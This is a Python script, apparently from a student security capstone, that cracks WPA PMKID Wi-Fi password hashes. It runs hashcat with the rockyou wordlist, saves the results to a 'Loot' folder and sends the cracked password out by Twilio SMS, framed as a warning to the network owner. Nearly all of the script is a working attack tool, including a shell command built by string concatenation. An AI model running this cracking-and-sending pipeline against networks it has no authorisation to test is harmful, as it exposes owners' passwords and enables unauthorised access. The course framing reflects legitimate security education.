#!/usr/bin/python3
#Project Overhaul
#Filename: ProjectOverhaulCracker.py
#ITSC-310 System Security Capstone
#Author: Checkmatte
#Python Script that will crack WPA_PMKID-PBKDF2 hashes
#############################################################################################################################################################################################################
import os
import subprocess
import time
import datetime
import socket
from twilio.rest import Client
#############################################################################################################################################################################################################
current_time = datetime.datetime.now() 		   # This will get the current time and date so when executed it will print the time and date
Hashes = "HASH.pmk"
#############################################################################################################################################################################################################
#Checks to see if the program was ran in root/sudo
if not 'SUDO_UID' in os.environ.keys():
	print("Project Overhaul must be ran in Sudo!")
	exit()

LootDir = subprocess.run(["mkdir","Loot"])
clear = subprocess.run(["clear"])
#This is a interface header
print("  _____           _           _      ____                 _                 _ ")
print(" |  __ \         (_)         | |    / __ \               | |               | |")
print(" | |__) | __ ___  _  ___  ___| |_  | |  | |_   _____ _ __| |__   __ _ _   _| |")
print(" |  ___/ '__/ _ \| |/ _ \/ __| __| | |  | \ \ / / _ \ '__| '_ \ / _` | | | | |")
print(" | |   | | | (_) | |  __/ (__| |_  | |__| |\ V /  __/ |  | | | | (_| | |_| | |")
print(" |_|   |_|  \___/| |\___|\___|\__|  \____/  \_/ \___|_|  |_| |_|\__,_|\__,_|_|")
print("                _/ |                                                          ")
print("               |__/                                                           ")
print("****************************************************************")
print("*                                                              *")
print("*                     Created by: Ryan Leonard                 *")
print("*                                                              *")
print("*                         Course: ITSC-310                     *")
print("*                                                              *")
print(current_time.strftime("*                       %Y-%m-%d||%I:%M:%S                   *"))
print("*                                                              *")
print("****************************************************************")


HC = subprocess.Popen("hashcat -m 16800 " + Hashes + " -a 0 -w 4 --force rockyou.txt --status --status-timer=5 -o Loot/Cracked.txt", shell=True)	#Im just spit balling right now this isnt the offical command and or finished script.
HC.wait()

# Find these values at https://twilio.com/user/account
# To set up environmental variables, see http://twil.io/secure
filename = "Loot/Cracked.txt"

contents = "Nothing in the file"

if os.path.exists( filename ):
	crack_file = open(filename, "r")
	contents = crack_file.read()

print("\n",contents)
account_sid = 'XXXXXXXXXXXXXXXXXXX'
auth_token = 'XXXXXXXXXXXXXXXXXXX'

client = Client(account_sid, auth_token)

client.api.account.messages.create(
	to="+'XXXXXXXXXXXXXXXXXXX'",
	from_="'XXXXXXXXXXXXXXXXXXX'",
	body="Hello there! You are receving this message as we were able to crack the following password:\n " + contents + "\nWe highly advise that you change your password on your Internet. We recommend that you use an 8+ digit password containing numbers, Capitals & Symbols")
		
